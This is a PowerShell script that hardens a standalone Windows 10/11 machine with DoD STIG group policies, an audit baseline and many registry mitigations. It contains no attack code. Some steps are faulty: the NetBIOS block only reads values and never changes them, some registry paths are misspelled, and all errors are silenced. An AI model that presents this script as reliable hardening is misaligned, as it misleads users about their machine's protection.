param(
    [Parameter(Mandatory = $false)]
    [bool]$windows = $true,
    [Parameter(Mandatory = $false)]
    [bool]$chrome = $true,
    [Parameter(Mandatory = $false)]
    [bool]$defender = $true,
    [Parameter(Mandatory = $false)]
    [bool]$firewall = $true
)

######SCRIPT FOR FULL INSTALL AND CONFIGURE ON STANDALONE MACHINE#####
#Continue on error
$ErrorActionPreference = 'silentlycontinue'

#Require elivation for script run
#Requires -RunAsAdministrator

#Store the current version of windows
$WinVer = (Get-CimInstance -Class Win32_OperatingSystem).Caption

#Set Directory to PSScriptRoot
if ((Get-Location).Path -NE $PSScriptRoot) { Set-Location $PSScriptRoot }

$date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$scriptName = $MyInvocation.MyCommand.Name
$freespace = (Get-WmiObject -class Win32_LogicalDisk | Where-Object { $_.DeviceID -eq 'C:' }).FreeSpace
$minfreespace = 10000000000 #10GB
if ($freespace -gt $minfreespace) {
    Write-Host "Taking a Restore Point Before Continuing...."
    $job = Start-Job -Name "Take Restore Point" -ScriptBlock {
        New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\SystemRestore' -Name 'SystemRestorePointCreationFrequency' -PropertyType DWORD -Value 0 -Force
        Checkpoint-Computer -Description "RestorePoint $scriptName $date" -RestorePointType "MODIFY_SETTINGS"
    }
    Wait-Job -Job $job
}

#GPO Configurations
function Import-GPOs([string]$gposdir) {
    Write-Host "Importing Group Policies from $gposdir ..." -ForegroundColor Green
    Foreach ($gpoitem in Get-ChildItem $gposdir) {
        Write-Host "Importing $gpoitem GPOs..." -ForegroundColor White
        $gpopath = "$gposdir\$gpoitem"
        #Write-Host "Importing $gpo" -ForegroundColor White
        .\Files\LGPO\LGPO.exe /g $gpopath > $null 2>&1
        #Write-Host "Done" -ForegroundColor Green
    }
}

Write-Host "Removing Existing Local GPOs" -ForegroundColor Green
#Remove and Refresh Local Policies
Remove-Item -Recurse -Force "$env:WinDir\System32\GroupPolicy" | Out-Null
Remove-Item -Recurse -Force "$env:WinDir\System32\GroupPolicyUsers" | Out-Null
secedit /configure /cfg "$env:WinDir\inf\defltbase.inf" /db defltbase.sdb /verbose | Out-Null
gpupdate /force | Out-Null

Write-Host "Implementing the Windows 10/11 STIGs" -ForegroundColor Green
if ($windows -eq $true) {
    if ($WinVer -Match "Windows 10") {
        Import-GPOs -gposdir ".\Files\GPOs\DoD\Windows 10"
    } ElseIf ($WinVer -Match "Windows 11") {
        Import-GPOs -gposdir ".\Files\GPOs\DoD\Windows 11"
    }

    Write-Host "Implementing simeononsecurity/Windows-Audit-Policy" -ForegroundColor Green
    Write-Host "https://github.com/simeononsecurity/Windows-Audit-Policy" -ForegroundColor Green 

    New-Item -Force -ItemType "Directory" "C:\temp"
    Copy-Item $PSScriptRoot\files\auditing\auditbaseline.csv C:\temp\auditbaseline.csv 

    #Import SecurityPolicy Module
    Copy-Item -Path ".\Files\SecurityPolicy" -Destination "C:\Program Files\WindowsPowerShell\Modules\SecurityPolicy" -Recurse
    Get-ChildItem "C:\Program Files\WindowsPowerShell\Modules\SecurityPolicy" -Recurse | Unblock-File
    Import-Module SecurityPolicy

    #Clear Audit Policy
    auditpol /clear /y

    #Enforce the Audit Policy Baseline
    auditpol /restore /file:C:\temp\auditbaseline.csv

    #Confirm Changes
    auditpol /list /user /v
    auditpol.exe /get /category:*

    #Basic authentication for RSS feeds over HTTP must not be used.
    New-Item -Path "HKLM:\Software\Policies\Microsoft\Internet Explorer" -Name "Feeds" -Force
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Internet Explorer\Feeds" -Name "AllowBasicAuthInClear" -Type "DWORD" -Value 0 -Force
    #Check for publishers certificate revocation must be enforced.
    New-Item -Path "HKLM:\Software\Microsoft\Windows\Current Version\WinTrust\Trust Providers\" -Name "Software Publishing" -Force
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\Current Version\WinTrust\Trust Providers\Software Publishing" -Name State -Type "DWORD" -Value 146432 -Force
    New-Item -Path "HKCU:\Software\Microsoft\Windows\Current Version\WinTrust\Trust Providers\" -Name "Software Publishing" -Force
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\Current Version\WinTrust\Trust Providers\Software Publishing" -Name State -Type "DWORD" -Value 146432 -Force
    #AutoComplete feature for forms must be disallowed.
    New-Item -Path "HKLM:\Software\Policies\Microsoft\Internet Explorer\" -Name "Main Criteria" -Force
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Internet Explorer\Main Criteria" -Name "Use FormSuggest" -Type "String" -Value no -Force
    New-Item -Path "HKCU:\Software\Policies\Microsoft\Internet Explorer\" -Name "Main Criteria" -Force
    Set-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Internet Explorer\Main Criteria" -Name "Use FormSuggest" -Type "String" -Value no -Force
    #Turn on the auto-complete feature for user names and passwords on forms must be disabled.
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Internet Explorer\Main Criteria" -Name "FormSuggest PW Ask" -Type "String" -Value no -Force
    Set-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Internet Explorer\Main Criteria" -Name "FormSuggest PW Ask" -Type "String" -Value no -Force
    #Windows 10 must be configured to prioritize ECC Curves with longer key lengths first.
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Cryptography\Configuration\SSL\00010002" -Name "EccCurves" -Type "MultiString" -Value "NistP384 NistP256" -Force
    #Zone information must be preserved when saving attachments.
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments\" -Name "Main Criteria" -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments\" -Name "SaveZoneInformation" -Type "DWORD" -Value 2 -Force
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments\" -Name "SaveZoneInformation" -Type "DWORD" -Value 2 -Force
    #Toast notifications to the lock screen must be turned off.
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\" -Name "PushNotifications" -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications\" -Name "NoToastApplicationNotificationOnLockScreen" -Type "DWORD" -Value 1 -Force
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications\" -Name "NoToastApplicationNotificationOnLockScreen" -Type "DWORD" -Value 1 -Force
    #Windows 10 should be configured to prevent users from receiving suggestions for third-party or additional applications.
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows" -Name "CloudContent" -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CloudContent" -Name "DisableThirdPartySuggestions" -Type "DWORD" -Value 1 -Force
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\CloudContent" -Name "DisableThirdPartySuggestions" -Type "DWORD" -Value 1 -Force
    #Windows 10 must be configured to prevent Windows apps from being activated by voice while the system is locked.
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows" -Name "AppPrivacy" -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy\" -Name "LetAppsActivateWithVoice" -Type "DWORD" -Value 2 -Force
    #The Windows Explorer Preview pane must be disabled for Windows 10.
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies" -Name "Explorer" -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoReadingPane" -Type "DWORD" -Value 1 -Force
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoReadingPane" -Type "DWORD" -Value 1 -Force
    #The use of a hardware security device with Windows Hello for Business must be enabled.
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft" -Name "PassportForWork" -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork\" -Name "RequireSecurityDevice" -Type "DWORD" -Value 1 -Force

    Write-Host "Implementing the General Vulnerability Mitigations" -ForegroundColor Green
    #####SPECTURE MELTDOWN#####
    #https://support.microsoft.com/en-us/help/4073119/protect-against-speculative-execution-side-channel-vulnerabilities-in
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name FeatureSettingsOverride -Type "DWORD" -Value 72 -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name FeatureSettingsOverrideMask -Type "DWORD" -Value 3 -Force
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Virtualization" -Name MinVmVersionForCpuBasedMitigations -Type "String" -Value "1.0" -Force

    #Disable LLMNR
    #https://www.blackhillsinfosec.com/how-to-disable-llmnr-why-you-want-to/
    New-Item -Path "HKLM:\Software\policies\Microsoft\Windows NT\" -Name "DNSClient" -Force
    Set-ItemProperty -Path "HKLM:\Software\policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Type "DWORD" -Value 0 -Force

    #Disable TCP Timestamps
    netsh int tcp set global timestamps=disabled

    #Enable DEP
    Set-Processmitigation -System -Enable DEP
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Explorer" -Name "NoDataExecutionPrevention" -Type "DWORD" -Value 0 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "DisableHHDEP" -Type "DWORD" -Value 0 -Force
    BCDEDIT /set "{current}" nx OptOut

    #Restrict anonymous shares
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "restrictanonymous" -Type "DWORD" -Value 1 -Force

    #Set LanMan auth level to send NTLMv2 response only, refuse LM and NTLM
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Type "DWORD" -Value 5 -Force

    #Configure all local user passwords to expire
    $users = Get-LocalUser
    foreach ($user in $users) {
    Set-LocalUser -Name $user.Name -PasswordNeverExpires $false
    }

    #Prevent autorun commands
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoAutorun" -Force
    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoAutorun" -Type "DWORD" -Value 1 -Force

    #Disable autoplay for all drives
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoDriveTypeAutoRun" -Force
    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoDriveTypeAutoRun" -Type "DWORD" -Value 255 -Force

    if ($WinVer -Match "Windows 10") {
        #Disable PowerShell 2.0
        Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -Remove -NoRestart
        Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 -Remove -NoRestart
    }

    #Disable Secondary Logon service
    Set-Service -Name "seclogon" -StartupType Disabled

    #Set account lockout duration to 15 minutes or greater
    net accounts /lockoutthreshold:3
    net accounts /lockoutduration:15
    net accounts /lockoutwindow:15

    #Enforce passowrd history to 24 passwords remembered
    net accounts /uniquepw:24

    #Set minimum password age to at least 1 day
    net accounts /minpwage:1

    #Set minimum password length to 14 characters
    net accounts /minpwlen:14

    #Enable Logon/Logoff Auditing
    auditpol /set /subcategory:"Account Lockout" /failure:enable

    #Enable audit of Object "Access File Share" failures
    auditpol /set /subcategory:"File Share" /failure:enable

    #Enable audit of Object "Access File Share" successes
    auditpol /set /subcategory:"File Share" /success:enable

    #Enable audit of Object Access "Other Object Access Events" successes 
    auditpol /set /subcategory:"Other Object Access Events" /success:enable

    #Enable audit of Object Access "Other Object Access Events" failures
    auditpol /set /subcategory:"Other Object Access Events" /failure:enable

    #Enable audit of Policy Change "Authorization Policy Change" successes
    auditpol /set /subcategory:"Authorization Policy Change" /success:enable

    #Enable audit of System "Other System Events" successes
    auditpol /set /subcategory:"Other System Events" /success:enable

    #Enable audit of System "Other System Events" failures
    auditpol /set /subcategory:"Other System Events" /failure:enable

    #Set security event log size to 1024000 KB or greater
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\Security" -Name "MaxSize" -Type "DWORD" -Value 1024000 -Force

    #Enable audit of Policy Change "Other Policy Change Events" failures 
    auditpol /set /subcategory:"Other Policy Change Events" /failure:enable

    #Enable audit of Logon/Logoff "Other Logon\Logoff Events" successes
    auditpol /set /subcategory:"Other Logon/Logoff Events" /success:enable

    #Enable audit of Logon/Logoff "Other Logon\Logoff Events" failures
    auditpol /set /subcategory:"Other Logon/Logoff Events" /failure:enable

    #Enable audit of Object Access "Detailed File Share" failures
    auditpol /set /subcategory:"Detailed File Share" /failure:enable

    #Enable audit of Policy Change "MPSSVC Rule-Level Policy Change" successes
    auditpol /set /subcategory:"MPSSVC Rule-Level Policy Change" /success:enable

    #Enable audit of Policy Change "MPSSVC Rule-Level Policy Change" failures
    auditpol /set /subcategory:"MPSSVC Rule-Level Policy Change" /failure:enable

    #Enable audit of Audit Process "Process Creation" failures
    auditpol /set /subcategory:"Process Creation" /failure:enable

    #Limit simultaneous connection to the internet
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WcmSvc\GroupPolicy" -Name "fMinimizeConnections" -Type "DWORD" -Value 3 -Force

    #Turn off Microsoft consumer experiences
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CloudContent" -Name "DisableWindowsConsumerFeatures" -Type "DWORD" -Value 1 -Force

    #Prevent web publishing and online ordering wizards from downloading lists of providers
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoWebServices" -Type "DWORD" -Value 1 -Force

    #Enable Windows Defender SmartScreen
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Type "DWORD" -Value 1 -Force

    #Set Windows 10 minimum pin length to 6 or more
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork" -Name "PINComplexity" -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\PassportForWork\PINComplexity" -Name "MinimumPINLength" -Type "DWORD" -Value 6 -Force

    #Disable RSS feed attachment downloads
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Internet Explorer\Feeds" -Name "DisableEnclosureDownload" -Type "DWORD" -Value 1 -Force

    #Rename Administrator account
    Rename-LocalUser -Name "Administrator" -NewName "SecAdmin"

    #Rename Guest account
    Rename-LocalUser -Name "Guest" -NewName "SecGuest"

    #Enable auto policy using subcategories
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "SCENoApplyLegacyAuditPolicy" -Type "DWORD" -Value 1 -Force

    #Set machine inactivity to 15 minutes
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "InactivityTimeoutSecs" -Type "DWORD" -Value 900 -Force

    #Set Smart Card removal option to Force Logoff
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "SCRemoveOption" -Type String -Value 1 -Force

    #Windows SMB client must be configured to always perform SMB packet signing
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Type "DWORD" -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" -Name "RequireSecuritySignature" -Type "DWORD" -Value 1 -Force

    #Restrict remote calls to SAM to admins
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictRemoteSAM" -Type String -Value "O:BAG:BAD:(A;;RC;;;BA)" -Force

    #NTLM must be prevented from falling back to a Null session
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "allownullsessionfallback" -Type "DWORD" -Value 0 -Force

    #Prevent PKU2U auth using online identities
    New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" -Name "pku2u" -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\pku2u" -Name "AllowOnlineID" -Type "DWORD" -Value 0 -Force

    #Prevent kerberos encryption types from using DES and RC4 encryption suites
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" -ItemType Directory -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" -Name "SupportedEncryptionTypes" -Type "DWORD" -Value 2147483640 -Force

    #Set minimum session security for NTLM SSP based clients
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "NTLMMinClientSec" -Type "DWORD" -Value 537395200 -Force

    #Set minimum session security for NTLM SSP based servers
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "NTLMMinServerSec" -Type "DWORD" -Value 537395200 -Force

    #Enable FIPS-compliant algorithms for encryption, hashing, and signing
    New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "FIPSAlgorithmPolicy" -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\FIPSAlgorithmPolicy" -Name "Enabled" -Type "DWORD" -Value 1 -Force

    #Enable user account control mode for built-in local admin
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "FilterAdministratorToken" -Type "DWORD" -Value 1 -Force 

    #Enable user account control prompts for local admin
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Type "DWORD" -Value 2 -Force

    #Deny user account control elevation requests for standard users
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorUser" -Type "DWORD" -Value 0 -Force

    #Update and configure .NET framework to support TLS
    Set-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\.NETFramework\v4.0.30319" -Name "SchUseStrongCrypto" -Type "DWORD" -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\.NETFramework\v4.0.30319" -Name "SchUseStrongCrypto" -Type "DWORD" -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Microsoft\.NETFramework\v4.0.30319" -Name "SystemDefaultTlsVersions" -Type "DWORD" -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\.NETFramework\v4.0.30319" -Name "SystemDefaultTlsVersions" -Type "DWORD" -Value 1 -Force

    #Enable SEHOP
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DisableExceptionChainValidation" -Type "DWORD" -Value 0 -Force

    #Disable NetBIOS by updating Registry
    #http://blog.dbsnet.fr/disable-netbios-with-powershell#:~:text=Disabling%20NetBIOS%20over%20TCP%2FIP,connection%2C%20then%20set%20NetbiosOptions%20%3D%202
    $key = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
    Get-ChildItem $key | ForEach-Object { 
    Write-Host("Modify $key\$($_.pschildname)")
    $NetbiosOptions_Value = (Get-ItemProperty "$key\$($_.pschildname)").NetbiosOptions
    Write-Host("NetbiosOptions updated value is $NetbiosOptions_Value")
    }

    #Disable WPAD
    #https://adsecurity.org/?p=3299
    New-Item -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\" -Name "Wpad" -Force
    New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad" -Name "Wpad" -Force
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad" -Name "WpadOverride" -Type "DWORD" -Value 1 -Force
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad" -Name "WpadOverride" -Type "DWORD" -Value 1 -Force

    #Enable LSA Protection/Auditing
    #https://adsecurity.org/?p=3299
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" -Name "LSASS.exe" -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe" -Name "AuditLevel" -Type "DWORD" -Value 8 -Force

    #Disable Windows Script Host
    #https://adsecurity.org/?p=3299
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows Script Host\" -Name "Settings" -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -Type "DWORD" -Value 0 -Force

    #Disable WDigest
    #https://adsecurity.org/?p=3299
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\SecurityProviders\Wdigest" -Name "UseLogonCredential" -Type "DWORD" -Value 0 -Force

    #Block Untrusted Fonts
    #https://adsecurity.org/?p=3299
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Kernel\" -Name "MitigationOptions" -Type "QWORD" -Value "1000000000000" -Force

    #Disable Office OLE
    #https://adsecurity.org/?p=3299
    $officeversions = '16.0', '15.0', '14.0', '12.0'
    ForEach ($officeversion in $officeversions) {
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Office\$officeversion\Outlook\" -Name "Security" -Force
    New-Item -Path "HKCU:\SOFTWARE\Microsoft\Office\$officeversion\Outlook\" -Name "Security" -Force
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Office\$officeversion\Outlook\Security\" -Name "ShowOLEPackageObj" -Type "DWORD" -Value "0" -Force
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Office\$officeversion\Outlook\Security\" -Name "ShowOLEPackageObj" -Type "DWORD" -Value "0" -Force
    }

    #Disable Hibernate
    powercfg -h off
}

if ($chrome -eq $true) {
    Import-GPOs -gposdir ".\Files\GPOs\DoD\Chrome"
}

if ($defender -eq $true) {
    Import-GPOs -gposdir ".\Files\GPOs\DoD\Defender"
}

if ($firewall -eq $true) {
    Import-GPOs -gposdir ".\Files\GPOs\DoD\Firewall"
}

Write-Host "Checking Backgrounded Processes"; Get-Job

Write-Host "Performing Group Policy Update"
$process = Start-Process -FilePath "gpupdate.exe" -ArgumentList "/force" -PassThru
$process.WaitForExit()  # Waits until gpupdate finishes
Write-Warning "A reboot is required for all changes to take effect"